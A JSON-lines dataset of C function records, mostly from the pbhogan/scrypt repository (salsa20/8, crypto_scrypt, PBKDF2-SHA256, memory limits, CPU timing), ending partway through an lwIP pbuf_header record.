{"docstring": "/**\n * salsa20_8(B):\n * Apply the salsa20/8 core to the provided block.\n */\n", "func_signal": "static void\nsalsa20_8(uint32_t B[16])", "code": "{\n\tuint32_t x[16];\n\tsize_t i;\n\n\tblkcpy(x, B, 64);\n\tfor (i = 0; i < 8; i += 2) {\n#define R(a,b) (((a) << (b)) | ((a) >> (32 - (b))))\n\t\t/* Operate on columns. */\n\t\tx[ 4] ^= R(x[ 0]+x[12], 7);  x[ 8] ^= R(x[ 4]+x[ 0], 9);\n\t\tx[12] ^= R(x[ 8]+x[ 4],13);  x[ 0] ^= R(x[12]+x[ 8],18);\n\n\t\tx[ 9] ^= R(x[ 5]+x[ 1], 7);  x[13] ^= R(x[ 9]+x[ 5], 9);\n\t\tx[ 1] ^= R(x[13]+x[ 9],13);  x[ 5] ^= R(x[ 1]+x[13],18);\n\n\t\tx[14] ^= R(x[10]+x[ 6], 7);  x[ 2] ^= R(x[14]+x[10], 9);\n\t\tx[ 6] ^= R(x[ 2]+x[14],13);  x[10] ^= R(x[ 6]+x[ 2],18);\n\n\t\tx[ 3] ^= R(x[15]+x[11], 7);  x[ 7] ^= R(x[ 3]+x[15], 9);\n\t\tx[11] ^= R(x[ 7]+x[ 3],13);  x[15] ^= R(x[11]+x[ 7],18);\n\n\t\t/* Operate on rows. */\n\t\tx[ 1] ^= R(x[ 0]+x[ 3], 7);  x[ 2] ^= R(x[ 1]+x[ 0], 9);\n\t\tx[ 3] ^= R(x[ 2]+x[ 1],13);  x[ 0] ^= R(x[ 3]+x[ 2],18);\n\n\t\tx[ 6] ^= R(x[ 5]+x[ 4], 7);  x[ 7] ^= R(x[ 6]+x[ 5], 9);\n\t\tx[ 4] ^= R(x[ 7]+x[ 6],13);  x[ 5] ^= R(x[ 4]+x[ 7],18);\n\n\t\tx[11] ^= R(x[10]+x[ 9], 7);  x[ 8] ^= R(x[11]+x[10], 9);\n\t\tx[ 9] ^= R(x[ 8]+x[11],13);  x[10] ^= R(x[ 9]+x[ 8],18);\n\n\t\tx[12] ^= R(x[15]+x[14], 7);  x[13] ^= R(x[12]+x[15], 9);\n\t\tx[14] ^= R(x[13]+x[12],13);  x[15] ^= R(x[14]+x[13],18);\n#undef R\n\t}\n\tfor (i = 0; i < 16; i++)\n\t\tB[i] += x[i];\n}", "path": "ext\\alt-impl\\crypto_scrypt-nosse.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/*\n * Encode a length len/4 vector of (uint32_t) into a length len vector of\n * (uint8_t) in big-endian form.  Assumes len is a multiple of 4.\n */\n", "func_signal": "static void\nbe32enc_vect(uint8_t * dst, const uint32_t * src, size_t len)", "code": "{\n\tsize_t i;\n\n\t/* Sanity-check. */\n\tassert(len % 4 == 0);\n\n\t/* Encode vector, one word at a time. */\n\tfor (i = 0; i < len / 4; i++)\n\t\tbe32enc(dst + i * 4, src[i]);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* HAVE_SYSINFO */\n", "func_signal": "static int\nmemlimit_rlimit(size_t * memlimit)", "code": "{\n#ifndef __MINGW32__\n\tstruct rlimit rl;\n\tuint64_t memrlimit;\n\n\t/* Find the least of... */\n\tmemrlimit = (uint64_t)(-1);\n\n\t/* ... RLIMIT_AS... */\n#ifdef RLIMIT_AS\n\tif (getrlimit(RLIMIT_AS, &rl))\n\t\treturn (1);\n\tif ((rl.rlim_cur != RLIM_INFINITY) &&\n\t    ((uint64_t)rl.rlim_cur < memrlimit))\n\t\tmemrlimit = rl.rlim_cur;\n#endif\n\n\t/* ... RLIMIT_DATA... */\n\tif (getrlimit(RLIMIT_DATA, &rl))\n\t\treturn (1);\n\tif ((rl.rlim_cur != RLIM_INFINITY) &&\n\t    ((uint64_t)rl.rlim_cur < memrlimit))\n\t\tmemrlimit = rl.rlim_cur;\n\n\t/* ... and RLIMIT_RSS. */\n#ifdef RLIMIT_RSS\n\tif (getrlimit(RLIMIT_RSS, &rl))\n\t\treturn (1);\n\tif ((rl.rlim_cur != RLIM_INFINITY) &&\n\t    ((uint64_t)rl.rlim_cur < memrlimit))\n\t\tmemrlimit = rl.rlim_cur;\n#endif\n\n\t/* Return the value, but clamp to SIZE_MAX if necessary. */\n#if UINT64_MAX > SIZE_MAX\n\tif (memrlimit > SIZE_MAX)\n\t\t*memlimit = SIZE_MAX;\n\telse\n\t\t*memlimit = memrlimit;\n#else\n\t*memlimit = memrlimit;\n#endif\n#else\n\t*memlimit = SIZE_MAX;\n#endif\n\t/* Success! */\n\treturn (0);\n}", "path": "ext\\scrypt\\memlimit.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* Free the name string. */\n", "func_signal": "static void\ndone(void)", "code": "{\n\n\tfree(name);\n\tname = NULL;\n}", "path": "ext\\scrypt\\warnp.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * crypto_scrypt(passwd, passwdlen, salt, saltlen, N, r, p, buf, buflen):\n * Compute scrypt(passwd[0 .. passwdlen - 1], salt[0 .. saltlen - 1], N, r,\n * p, buflen) and write the result into buf.  The parameters r, p, and buflen\n * must satisfy r * p < 2^30 and buflen <= (2^32 - 1) * 32.  The parameter N\n * must be a power of 2.\n *\n * Return 0 on success; or -1 on error.\n */\n", "func_signal": "int\ncrypto_scrypt(const uint8_t * passwd, size_t passwdlen,\n    const uint8_t * salt, size_t saltlen, uint64_t N, uint32_t _r, uint32_t _p,\n    uint8_t * buf, size_t buflen)", "code": "{\n\tuint8_t * B;\n\tuint8_t * V;\n\tuint8_t * XY;\n\tsize_t r = _r, p = _p;\n\tuint32_t i;\n\n\t/* Sanity-check parameters. */\n#if SIZE_MAX > UINT32_MAX\n\tif (buflen > (((uint64_t)(1) << 32) - 1) * 32) {\n\t\terrno = EFBIG;\n\t\tgoto err0;\n\t}\n#endif\n\tif ((uint64_t)(r) * (uint64_t)(p) >= (1 << 30)) {\n\t\terrno = EFBIG;\n\t\tgoto err0;\n\t}\n\tif (((N & (N - 1)) != 0) || (N == 0)) {\n\t\terrno = EINVAL;\n\t\tgoto err0;\n\t}\n\tif ((r > SIZE_MAX / 128 / p) ||\n#if SIZE_MAX / 256 <= UINT32_MAX\n\t    (r > SIZE_MAX / 256) ||\n#endif\n\t    (N > SIZE_MAX / 128 / r)) {\n\t\terrno = ENOMEM;\n\t\tgoto err0;\n\t}\n\n\t/* Allocate memory. */\n\tif ((B = malloc(128 * r * p)) == NULL)\n\t\tgoto err0;\n\tif ((XY = malloc(256 * r)) == NULL)\n\t\tgoto err1;\n\tif ((V = malloc(128 * r * N)) == NULL)\n\t\tgoto err2;\n\n\t/* 1: (B_0 ... B_{p-1}) <-- PBKDF2(P, S, 1, p * MFLen) */\n\tPBKDF2_scrypt_SHA256(passwd, passwdlen, salt, saltlen, 1, B, p * 128 * r);\n\n\t/* 2: for i = 0 to p - 1 do */\n\tfor (i = 0; i < p; i++) {\n\t\t/* 3: B_i <-- MF(B_i, N) */\n\t\tsmix(&B[i * 128 * r], r, N, V, XY);\n\t}\n\n\t/* 5: DK <-- PBKDF2(P, B, 1, dkLen) */\n\tPBKDF2_scrypt_SHA256(passwd, passwdlen, B, p * 128 * r, 1, buf, buflen);\n\n\t/* Free memory. */\n\tfree(V);\n\tfree(XY);\n\tfree(B);\n\n\t/* Success! */\n\treturn (0);\n\nerr2:\n\tfree(XY);\nerr1:\n\tfree(B);\nerr0:\n\t/* Failure! */\n\treturn (-1);\n}", "path": "ext\\alt-impl\\crypto_scrypt-ref.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * crypto_scrypt(passwd, passwdlen, salt, saltlen, N, r, p, buf, buflen):\n * Compute scrypt(passwd[0 .. passwdlen - 1], salt[0 .. saltlen - 1], N, r,\n * p, buflen) and write the result into buf.  The parameters r, p, and buflen\n * must satisfy r * p < 2^30 and buflen <= (2^32 - 1) * 32.  The parameter N\n * must be a power of 2 greater than 1.\n *\n * Return 0 on success; or -1 on error.\n */\n", "func_signal": "int\ncrypto_scrypt(const uint8_t * passwd, size_t passwdlen,\n    const uint8_t * salt, size_t saltlen, uint64_t N, uint32_t _r, uint32_t _p,\n    uint8_t * buf, size_t buflen)", "code": "{\n\tvoid * B0, * V0, * XY0;\n\tuint8_t * B;\n\tuint32_t * V;\n\tuint32_t * XY;\n\tsize_t r = _r, p = _p;\n\tuint32_t i;\n\n\t/* Sanity-check parameters. */\n#if SIZE_MAX > UINT32_MAX\n\tif (buflen > (((uint64_t)(1) << 32) - 1) * 32) {\n\t\terrno = EFBIG;\n\t\tgoto err0;\n\t}\n#endif\n\tif ((uint64_t)(r) * (uint64_t)(p) >= (1 << 30)) {\n\t\terrno = EFBIG;\n\t\tgoto err0;\n\t}\n\tif (((N & (N - 1)) != 0) || (N < 2)) {\n\t\terrno = EINVAL;\n\t\tgoto err0;\n\t}\n\tif ((r > SIZE_MAX / 128 / p) ||\n#if SIZE_MAX / 256 <= UINT32_MAX\n\t    (r > SIZE_MAX / 256) ||\n#endif\n\t    (N > SIZE_MAX / 128 / r)) {\n\t\terrno = ENOMEM;\n\t\tgoto err0;\n\t}\n\n\t/* Allocate memory. */\n#ifdef HAVE_POSIX_MEMALIGN\n\tif ((errno = posix_memalign(&B0, 64, 128 * r * p)) != 0)\n\t\tgoto err0;\n\tB = (uint8_t *)(B0);\n\tif ((errno = posix_memalign(&XY0, 64, 256 * r + 64)) != 0)\n\t\tgoto err1;\n\tXY = (uint32_t *)(XY0);\n#ifndef MAP_ANON\n\tif ((errno = posix_memalign(&V0, 64, 128 * r * N)) != 0)\n\t\tgoto err2;\n\tV = (uint32_t *)(V0);\n#endif\n#else\n\tif ((B0 = malloc(128 * r * p + 63)) == NULL)\n\t\tgoto err0;\n\tB = (uint8_t *)(((uintptr_t)(B0) + 63) & ~ (uintptr_t)(63));\n\tif ((XY0 = malloc(256 * r + 64 + 63)) == NULL)\n\t\tgoto err1;\n\tXY = (uint32_t *)(((uintptr_t)(XY0) + 63) & ~ (uintptr_t)(63));\n#ifndef MAP_ANON\n\tif ((V0 = malloc(128 * r * N + 63)) == NULL)\n\t\tgoto err2;\n\tV = (uint32_t *)(((uintptr_t)(V0) + 63) & ~ (uintptr_t)(63));\n#endif\n#endif\n#ifdef MAP_ANON\n\tif ((V0 = mmap(NULL, 128 * r * N, PROT_READ | PROT_WRITE,\n#ifdef MAP_NOCORE\n\t    MAP_ANON | MAP_PRIVATE | MAP_NOCORE,\n#else\n\t    MAP_ANON | MAP_PRIVATE,\n#endif\n\t    -1, 0)) == MAP_FAILED)\n\t\tgoto err2;\n\tV = (uint32_t *)(V0);\n#endif\n\n\t/* 1: (B_0 ... B_{p-1}) <-- PBKDF2(P, S, 1, p * MFLen) */\n\tPBKDF2_scrypt_SHA256(passwd, passwdlen, salt, saltlen, 1, B, p * 128 * r);\n\n\t/* 2: for i = 0 to p - 1 do */\n\tfor (i = 0; i < p; i++) {\n\t\t/* 3: B_i <-- MF(B_i, N) */\n\t\tsmix(&B[i * 128 * r], r, N, V, XY);\n\t}\n\n\t/* 5: DK <-- PBKDF2(P, B, 1, dkLen) */\n\tPBKDF2_scrypt_SHA256(passwd, passwdlen, B, p * 128 * r, 1, buf, buflen);\n\n\t/* Free memory. */\n#ifdef MAP_ANON\n\tif (munmap(V0, 128 * r * N))\n\t\tgoto err2;\n#else\n\tfree(V0);\n#endif\n\tfree(XY0);\n\tfree(B0);\n\n\t/* Success! */\n\treturn (0);\n\nerr2:\n\tfree(XY0);\nerr1:\n\tfree(B0);\nerr0:\n\t/* Failure! */\n\treturn (-1);\n}", "path": "ext\\alt-impl\\crypto_scrypt-nosse.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * scryptenc_cpuperf(opps):\n * Estimate the number of salsa20/8 cores which can be executed per second,\n * and return the value via opps.\n */\n", "func_signal": "int\nscryptenc_cpuperf(double * opps)", "code": "{\n\tstruct timespec st;\n\tdouble resd, diffd;\n\tuint64_t i = 0;\n\n\t/* Get the clock resolution. */\n\tif (getclockres(&resd))\n\t\treturn (2);\n\n#ifdef DEBUG\n\tfprintf(stderr, \"Clock resolution is %f\\n\", resd);\n#endif\n\n\t/* Loop until the clock ticks. */\n\tif (getclocktime(&st))\n\t\treturn (2);\n\tdo {\n\t\t/* Do an scrypt. */\n\t\tif (crypto_scrypt(NULL, 0, NULL, 0, 16, 1, 1, NULL, 0))\n\t\t\treturn (3);\n\n\t\t/* Has the clock ticked? */\n\t\tif (getclockdiff(&st, &diffd))\n\t\t\treturn (2);\n\t\tif (diffd > 0)\n\t\t\tbreak;\n\t} while (1);\n\n\t/* Count how many scrypts we can do before the next tick. */\n\tif (getclocktime(&st))\n\t\treturn (2);\n\tdo {\n\t\t/* Do an scrypt. */\n\t\tif (crypto_scrypt(NULL, 0, NULL, 0, 128, 1, 1, NULL, 0))\n\t\t\treturn (3);\n\n\t\t/* We invoked the salsa20/8 core 512 times. */\n\t\ti += 512;\n\n\t\t/* Check if we have looped for long enough. */\n\t\tif (getclockdiff(&st, &diffd))\n\t\t\treturn (2);\n\t\tif (diffd > resd)\n\t\t\tbreak;\n\t} while (1);\n\n#ifdef DEBUG\n\tfprintf(stderr, \"%ju salsa20/8 cores performed in %f seconds\\n\",\n\t\t\t(uintmax_t)i, diffd);\n#endif\n\n\t/* We can do approximately i salsa20/8 cores per diffd seconds. */\n\t*opps = i / diffd;\n\treturn (0);\n}", "path": "ext\\scrypt\\scryptenc_cpuperf.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * PBKDF2_SHA256(passwd, passwdlen, salt, saltlen, c, buf, dkLen):\n * Compute PBKDF2(passwd, salt, c, dkLen) using HMAC-SHA256 as the PRF, and\n * write the output to buf.  The value dkLen must be at most 32 * (2^32 - 1).\n */\n", "func_signal": "void\nPBKDF2_SHA256(const uint8_t * passwd, size_t passwdlen, const uint8_t * salt,\n    size_t saltlen, uint64_t c, uint8_t * buf, size_t dkLen)", "code": "{\n\tHMAC_SHA256_CTX Phctx, PShctx, hctx;\n\tuint32_t tmp32[72];\n\tuint8_t tmp8[96];\n\tsize_t i;\n\tuint8_t ivec[4];\n\tuint8_t U[32];\n\tuint8_t T[32];\n\tuint64_t j;\n\tint k;\n\tsize_t clen;\n\n\t/* Sanity-check. */\n\tassert(dkLen <= 32 * (size_t)(UINT32_MAX));\n\n\t/* Compute HMAC state after processing P. */\n\t_HMAC_SHA256_Init(&Phctx, passwd, passwdlen,\n\t    tmp32, &tmp8[0], &tmp8[64]);\n\n\t/* Compute HMAC state after processing P and S. */\n\tmemcpy(&PShctx, &Phctx, sizeof(HMAC_SHA256_CTX));\n\t_HMAC_SHA256_Update(&PShctx, salt, saltlen, tmp32);\n\n\t/* Iterate through the blocks. */\n\tfor (i = 0; i * 32 < dkLen; i++) {\n\t\t/* Generate INT(i + 1). */\n\t\tbe32enc(ivec, (uint32_t)(i + 1));\n\n\t\t/* Compute U_1 = PRF(P, S || INT(i)). */\n\t\tmemcpy(&hctx, &PShctx, sizeof(HMAC_SHA256_CTX));\n\t\t_HMAC_SHA256_Update(&hctx, ivec, 4, tmp32);\n\t\t_HMAC_SHA256_Final(U, &hctx, tmp32, tmp8);\n\n\t\t/* T_i = U_1 ... */\n\t\tmemcpy(T, U, 32);\n\n\t\tfor (j = 2; j <= c; j++) {\n\t\t\t/* Compute U_j. */\n\t\t\tmemcpy(&hctx, &Phctx, sizeof(HMAC_SHA256_CTX));\n\t\t\t_HMAC_SHA256_Update(&hctx, U, 32, tmp32);\n\t\t\t_HMAC_SHA256_Final(U, &hctx, tmp32, tmp8);\n\n\t\t\t/* ... xor U_j ... */\n\t\t\tfor (k = 0; k < 32; k++)\n\t\t\t\tT[k] ^= U[k];\n\t\t}\n\n\t\t/* Copy as many bytes as necessary into buf. */\n\t\tclen = dkLen - i * 32;\n\t\tif (clen > 32)\n\t\t\tclen = 32;\n\t\tmemcpy(&buf[i * 32], T, clen);\n\t}\n\n\t/* Clean the stack. */\n\tinsecure_memzero(&Phctx, sizeof(HMAC_SHA256_CTX));\n\tinsecure_memzero(&PShctx, sizeof(HMAC_SHA256_CTX));\n\tinsecure_memzero(&hctx, sizeof(HMAC_SHA256_CTX));\n\tinsecure_memzero(tmp32, 288);\n\tinsecure_memzero(tmp8, 96);\n\tinsecure_memzero(U, 32);\n\tinsecure_memzero(T, 32);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* Wrapper function for intermediate-values sanitization. */\n", "func_signal": "void\nSHA256_Update(SHA256_CTX * ctx, const void * in, size_t len)", "code": "{\n\tuint32_t tmp32[72];\n\n\t/* Call the real function. */\n\t_SHA256_Update(ctx, in, len, tmp32);\n\n\t/* Clean the stack. */\n\tinsecure_memzero(tmp32, 288);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* Wrapper function for intermediate-values sanitization. */\n", "func_signal": "void\nHMAC_SHA256_Final(uint8_t digest[32], HMAC_SHA256_CTX * ctx)", "code": "{\n\tuint32_t tmp32[72];\n\tuint8_t ihash[32];\n\n\t/* Call the real function. */\n\t_HMAC_SHA256_Final(digest, ctx, tmp32, ihash);\n\n\t/* Clean the stack. */\n\tinsecure_memzero(tmp32, 288);\n\tinsecure_memzero(ihash, 32);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * salsa20_8(B):\n * Apply the salsa20/8 core to the provided block.\n */\n", "func_signal": "static void\nsalsa20_8(uint8_t B[64])", "code": "{\n\tuint32_t B32[16];\n\tuint32_t x[16];\n\tsize_t i;\n\n\t/* Convert little-endian values in. */\n\tfor (i = 0; i < 16; i++)\n\t\tB32[i] = le32dec(&B[i * 4]);\n\n\t/* Compute x = doubleround^4(B32). */\n\tfor (i = 0; i < 16; i++)\n\t\tx[i] = B32[i];\n\tfor (i = 0; i < 8; i += 2) {\n#define R(a,b) (((a) << (b)) | ((a) >> (32 - (b))))\n\t\t/* Operate on columns. */\n\t\tx[ 4] ^= R(x[ 0]+x[12], 7);  x[ 8] ^= R(x[ 4]+x[ 0], 9);\n\t\tx[12] ^= R(x[ 8]+x[ 4],13);  x[ 0] ^= R(x[12]+x[ 8],18);\n\n\t\tx[ 9] ^= R(x[ 5]+x[ 1], 7);  x[13] ^= R(x[ 9]+x[ 5], 9);\n\t\tx[ 1] ^= R(x[13]+x[ 9],13);  x[ 5] ^= R(x[ 1]+x[13],18);\n\n\t\tx[14] ^= R(x[10]+x[ 6], 7);  x[ 2] ^= R(x[14]+x[10], 9);\n\t\tx[ 6] ^= R(x[ 2]+x[14],13);  x[10] ^= R(x[ 6]+x[ 2],18);\n\n\t\tx[ 3] ^= R(x[15]+x[11], 7);  x[ 7] ^= R(x[ 3]+x[15], 9);\n\t\tx[11] ^= R(x[ 7]+x[ 3],13);  x[15] ^= R(x[11]+x[ 7],18);\n\n\t\t/* Operate on rows. */\n\t\tx[ 1] ^= R(x[ 0]+x[ 3], 7);  x[ 2] ^= R(x[ 1]+x[ 0], 9);\n\t\tx[ 3] ^= R(x[ 2]+x[ 1],13);  x[ 0] ^= R(x[ 3]+x[ 2],18);\n\n\t\tx[ 6] ^= R(x[ 5]+x[ 4], 7);  x[ 7] ^= R(x[ 6]+x[ 5], 9);\n\t\tx[ 4] ^= R(x[ 7]+x[ 6],13);  x[ 5] ^= R(x[ 4]+x[ 7],18);\n\n\t\tx[11] ^= R(x[10]+x[ 9], 7);  x[ 8] ^= R(x[11]+x[10], 9);\n\t\tx[ 9] ^= R(x[ 8]+x[11],13);  x[10] ^= R(x[ 9]+x[ 8],18);\n\n\t\tx[12] ^= R(x[15]+x[14], 7);  x[13] ^= R(x[12]+x[15], 9);\n\t\tx[14] ^= R(x[13]+x[12],13);  x[15] ^= R(x[14]+x[13],18);\n#undef R\n\t}\n\n\t/* Compute B32 = B32 + x. */\n\tfor (i = 0; i < 16; i++)\n\t\tB32[i] += x[i];\n\n\t/* Convert little-endian values out. */\n\tfor (i = 0; i < 16; i++)\n\t\tle32enc(&B[4 * i], B32[i]);\n}", "path": "ext\\alt-impl\\crypto_scrypt-ref.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * salsa20_8(B):\n * Apply the salsa20/8 core to the provided block.\n */\n", "func_signal": "static void\nsalsa20_8(uint32_t B[16])", "code": "{\n\tuint32_t x[16];\n\tsize_t i;\n\n\tblkcpy(x, B, 64);\n\tfor (i = 0; i < 8; i += 2) {\n#define R(a,b) (((a) << (b)) | ((a) >> (32 - (b))))\n\t\t/* Operate on columns. */\n\t\tx[ 4] ^= R(x[ 0]+x[12], 7);  x[ 8] ^= R(x[ 4]+x[ 0], 9);\n\t\tx[12] ^= R(x[ 8]+x[ 4],13);  x[ 0] ^= R(x[12]+x[ 8],18);\n\n\t\tx[ 9] ^= R(x[ 5]+x[ 1], 7);  x[13] ^= R(x[ 9]+x[ 5], 9);\n\t\tx[ 1] ^= R(x[13]+x[ 9],13);  x[ 5] ^= R(x[ 1]+x[13],18);\n\n\t\tx[14] ^= R(x[10]+x[ 6], 7);  x[ 2] ^= R(x[14]+x[10], 9);\n\t\tx[ 6] ^= R(x[ 2]+x[14],13);  x[10] ^= R(x[ 6]+x[ 2],18);\n\n\t\tx[ 3] ^= R(x[15]+x[11], 7);  x[ 7] ^= R(x[ 3]+x[15], 9);\n\t\tx[11] ^= R(x[ 7]+x[ 3],13);  x[15] ^= R(x[11]+x[ 7],18);\n\n\t\t/* Operate on rows. */\n\t\tx[ 1] ^= R(x[ 0]+x[ 3], 7);  x[ 2] ^= R(x[ 1]+x[ 0], 9);\n\t\tx[ 3] ^= R(x[ 2]+x[ 1],13);  x[ 0] ^= R(x[ 3]+x[ 2],18);\n\n\t\tx[ 6] ^= R(x[ 5]+x[ 4], 7);  x[ 7] ^= R(x[ 6]+x[ 5], 9);\n\t\tx[ 4] ^= R(x[ 7]+x[ 6],13);  x[ 5] ^= R(x[ 4]+x[ 7],18);\n\n\t\tx[11] ^= R(x[10]+x[ 9], 7);  x[ 8] ^= R(x[11]+x[10], 9);\n\t\tx[ 9] ^= R(x[ 8]+x[11],13);  x[10] ^= R(x[ 9]+x[ 8],18);\n\n\t\tx[12] ^= R(x[15]+x[14], 7);  x[13] ^= R(x[12]+x[15], 9);\n\t\tx[14] ^= R(x[13]+x[12],13);  x[15] ^= R(x[14]+x[13],18);\n#undef R\n\t}\n\tfor (i = 0; i < 16; i++)\n\t\tB[i] += x[i];\n}", "path": "ext\\scrypt\\crypto_scrypt_smix.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * salsa20_8(B):\n * Apply the salsa20/8 core to the provided block.\n */\n", "func_signal": "static void\nsalsa20_8(__m128i B[4])", "code": "{\n\t__m128i X0, X1, X2, X3;\n\t__m128i T;\n\tsize_t i;\n\n\tX0 = B[0];\n\tX1 = B[1];\n\tX2 = B[2];\n\tX3 = B[3];\n\n\tfor (i = 0; i < 8; i += 2) {\n\t\t/* Operate on \"columns\". */\n\t\tT = _mm_add_epi32(X0, X3);\n\t\tX1 = _mm_xor_si128(X1, _mm_slli_epi32(T, 7));\n\t\tX1 = _mm_xor_si128(X1, _mm_srli_epi32(T, 25));\n\t\tT = _mm_add_epi32(X1, X0);\n\t\tX2 = _mm_xor_si128(X2, _mm_slli_epi32(T, 9));\n\t\tX2 = _mm_xor_si128(X2, _mm_srli_epi32(T, 23));\n\t\tT = _mm_add_epi32(X2, X1);\n\t\tX3 = _mm_xor_si128(X3, _mm_slli_epi32(T, 13));\n\t\tX3 = _mm_xor_si128(X3, _mm_srli_epi32(T, 19));\n\t\tT = _mm_add_epi32(X3, X2);\n\t\tX0 = _mm_xor_si128(X0, _mm_slli_epi32(T, 18));\n\t\tX0 = _mm_xor_si128(X0, _mm_srli_epi32(T, 14));\n\n\t\t/* Rearrange data. */\n\t\tX1 = _mm_shuffle_epi32(X1, 0x93);\n\t\tX2 = _mm_shuffle_epi32(X2, 0x4E);\n\t\tX3 = _mm_shuffle_epi32(X3, 0x39);\n\n\t\t/* Operate on \"rows\". */\n\t\tT = _mm_add_epi32(X0, X1);\n\t\tX3 = _mm_xor_si128(X3, _mm_slli_epi32(T, 7));\n\t\tX3 = _mm_xor_si128(X3, _mm_srli_epi32(T, 25));\n\t\tT = _mm_add_epi32(X3, X0);\n\t\tX2 = _mm_xor_si128(X2, _mm_slli_epi32(T, 9));\n\t\tX2 = _mm_xor_si128(X2, _mm_srli_epi32(T, 23));\n\t\tT = _mm_add_epi32(X2, X3);\n\t\tX1 = _mm_xor_si128(X1, _mm_slli_epi32(T, 13));\n\t\tX1 = _mm_xor_si128(X1, _mm_srli_epi32(T, 19));\n\t\tT = _mm_add_epi32(X1, X2);\n\t\tX0 = _mm_xor_si128(X0, _mm_slli_epi32(T, 18));\n\t\tX0 = _mm_xor_si128(X0, _mm_srli_epi32(T, 14));\n\n\t\t/* Rearrange data. */\n\t\tX1 = _mm_shuffle_epi32(X1, 0x39);\n\t\tX2 = _mm_shuffle_epi32(X2, 0x4E);\n\t\tX3 = _mm_shuffle_epi32(X3, 0x93);\n\t}\n\n\tB[0] = _mm_add_epi32(B[0], X0);\n\tB[1] = _mm_add_epi32(B[1], X1);\n\tB[2] = _mm_add_epi32(B[2], X2);\n\tB[3] = _mm_add_epi32(B[3], X3);\n}", "path": "ext\\scrypt\\crypto_scrypt_smix_sse2.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * crypto_scrypt(passwd, passwdlen, salt, saltlen, N, r, p, buf, buflen):\n * Compute scrypt(passwd[0 .. passwdlen - 1], salt[0 .. saltlen - 1], N, r,\n * p, buflen) and write the result into buf.  The parameters r, p, and buflen\n * must satisfy r * p < 2^30 and buflen <= (2^32 - 1) * 32.  The parameter N\n * must be a power of 2 greater than 1.\n *\n * Return 0 on success; or -1 on error.\n */\n", "func_signal": "int\ncrypto_scrypt(const uint8_t * passwd, size_t passwdlen,\n    const uint8_t * salt, size_t saltlen, uint64_t N, uint32_t _r, uint32_t _p,\n    uint8_t * buf, size_t buflen)", "code": "{\n\n\tif (smix_func == NULL)\n\t\tselectsmix();\n\n\treturn (_crypto_scrypt(passwd, passwdlen, salt, saltlen, N, _r, _p,\n\t    buf, buflen, smix_func));\n}", "path": "ext\\scrypt\\crypto_scrypt.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* Function which does the zeroing. */\n", "func_signal": "static void\ninsecure_memzero_func(volatile void * buf, size_t len)", "code": "{\n\tvolatile uint8_t * _buf = buf;\n\tsize_t i;\n\n\tfor (i = 0; i < len; i++)\n\t\t_buf[i] = 0;\n}", "path": "ext\\scrypt\\insecure_memzero.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * Adjusts the payload pointer to hide or reveal headers in the payload.\n *\n * Adjusts the ->payload pointer so that space for a header\n * (dis)appears in the pbuf payload.\n *\n * The ->payload, ->tot_len and ->len fields are adjusted.\n *\n * @param p pbuf to change the header size.\n * @param header_size_increment Number of bytes to increment header size which\n * increases the size of the pbuf. New space is on the front.\n * (Using a negative value decreases the header size.)\n * If hdr_size_inc is 0, this function does nothing and returns succesful.\n *\n * PBUF_ROM and PBUF_REF type buffers cannot have their sizes increased, so\n * the call will fail. A check is made that the increase in header size does\n * not move the payload pointer in front of the start of the buffer.\n * @return non-zero on failure, zero on success.\n *\n */\n", "func_signal": "u8_t\npbuf_header(struct pbuf *p, s16_t header_size_increment)", "code": "{\n  u16_t type;\n  void *payload;\n  u16_t increment_magnitude;\n\n  LWIP_ASSERT(\"p != NULL\", p != NULL);\n  if ((header_size_increment == 0) || (p == NULL)) {\n    return 0;\n  }\n \n  if (header_size_increment < 0){\n    increment_magnitude = -header_size_increment;\n    /* Check that we aren't going to move off the end of the pbuf */\n    LWIP_ERROR(\"increment_magnitude <= p->len\", (increment_magnitude <= p->len), return 1;);\n  } else {\n    increment_magnitude = header_size_increment;\n#if 0\n    /* Can't assert these as some callers speculatively call\n         pbuf_header() to see if it's OK.  Will return 1 below instead. */\n    /* Check that we've got the correct type of pbuf to work with */\n    LWIP_ASSERT(\"p->type == PBUF_RAM || p->type == PBUF_POOL\", \n                p->type == PBUF_RAM || p->type == PBUF_POOL);\n    /* Check that we aren't going to move off the beginning of the pbuf */\n    LWIP_ASSERT(\"p->payload - increment_magnitude >= p + SIZEOF_STRUCT_PBUF\",\n                (u8_t *)p->payload - increment_magnitude >= (u8_t *)p + SIZEOF_STRUCT_PBUF);\n#endif\n  }\n\n  type = p->type;\n  /* remember current payload pointer */\n  payload = p->payload;\n\n  /* pbuf types containing payloads? */\n  if (type == PBUF_RAM || type == PBUF_POOL) {\n    /* set new payload pointer */\n    p->payload = (u8_t *)p->payload - header_size_increment;\n    /* boundary check fails? */\n    if ((u8_t *)p->payload < (u8_t *)p + SIZEOF_STRUCT_PBUF + EP_OFFSET) {\n      LWIP_DEBUGF( PBUF_DEBUG | 